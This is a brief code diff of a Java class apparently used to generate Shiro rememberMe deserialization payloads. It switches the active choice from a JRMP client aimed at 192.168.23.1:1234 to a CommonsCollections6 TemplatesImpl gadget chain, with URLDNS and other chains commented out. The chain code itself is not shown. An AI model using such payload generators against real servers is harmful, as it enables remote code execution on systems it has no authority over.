@@ -31,9 +31,9 @@ public class toRememberMe {
     }
     public static void main(String[] args) throws Exception {
         //CC2TemplatesImpl();
-        //CC6TemplatesImpl();
+        CC6TemplatesImpl();
         //URLDNS("xxx");
-        JRMP(new String[]{"JRMPClient", "192.168.23.1:1234"});
+        //JRMP(new String[]{"JRMPClient", "192.168.23.1:1234"});
         //JRMP(new String[]{"JRMPListener", "7852"});
     }
 }
